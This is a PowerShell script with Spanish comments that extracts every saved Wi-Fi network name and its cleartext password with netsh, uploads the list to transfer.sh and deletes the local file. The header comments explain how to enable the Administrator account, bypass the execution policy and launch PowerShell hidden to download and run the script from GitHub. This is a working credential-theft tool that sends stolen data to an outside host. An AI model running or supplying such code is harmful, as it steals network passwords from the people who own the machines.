###### Instrucciones ####
# Para poderlo correr en caso de que la maquina no deje por permisos
#	net user administrador /active:yes
#	net user administrador canela	
#	runass.exe /user:administrador powershell
#	Set-ExecutionPolicy Unrestricted
#
# powershell.exe 
#	-w hidden 
#	-nop 
#	-ep bypass 
#	-c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/rulosan/pst00ls/master/WifiExtractor.ps1 -OutFile WifiExtractor.ps1"
#
# powershell.exe -w hidden -nop -ep bypass -c ".\WifiExtractor.ps1"
#########################


function WifiExtractor {
	[cmdletbinding()]

	Param(
		[Parameter(Mandatory=$True)]
		[string] $FileName
	)

	$cult = Get-Culture

	if ($cult.Name -eq "es-MX")
	{
		$first_filter = "usuarios";
		$second_filter = "Contenido de la Clave";
	}
	
	
	# Nos traemos todos los SSIDs a los que ha estado conectada la maquina
	$allwifi = netsh.exe wlan show profiles | Select-String -Pattern $first_filter | ForEach-Object { ($_).ToString().Split(":")[1].Trim() };
	$collector = @();
	foreach($el in $allwifi){
		$temporal = netsh.exe wlan show profiles name="$el" key=clear | Select-String -Pattern $second_filter
		$password = $temporal.ToString().Split(":")[1].Trim()

		$res = New-Object PSObject -Property @{
			"ssid"=$el
			"password"=$password
		}
		$collector += $res
	}
	$FinalFileName = $FileName + ".txt";
	$collector | Out-File -FilePath $FinalFileName;
	$url = "https://transfer.sh/" + $FinalFileName;
	$res = Invoke-WebRequest -uri $url -Method put -InFile $FinalFileName -ContentType "multipart/form-data";
	rm $FinalFileName
	$res.Content | Out-File -FilePath url.txt;
	notepad url.txt;
}

WifiExtractor -FileName collector